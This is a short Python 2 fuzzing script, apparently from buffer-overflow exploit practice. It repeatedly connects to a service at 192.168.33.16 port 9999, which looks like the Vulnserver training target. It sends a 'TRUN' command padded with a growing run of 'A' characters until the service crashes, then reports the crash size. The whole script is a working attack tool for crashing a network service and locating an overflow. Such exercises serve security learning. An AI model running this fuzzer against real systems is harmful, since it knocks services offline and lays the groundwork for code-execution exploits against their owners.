#!/usr/bin/env python2

import sys, socket
from time import sleep

buffer = 'A' * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.33.16', 9999))

        cmd = ('TRUN /.:/' + buffer)
        # print("SEND "+cmd)
        s.send(cmd)
        print("sent %d bytes" % len(buffer))
        s.close()
        sleep(1)

        buffer = buffer + ("A" * 100)
    except:
        print("crashed at %d bytes" % len(buffer))
        # print(e)
        sys.exit()
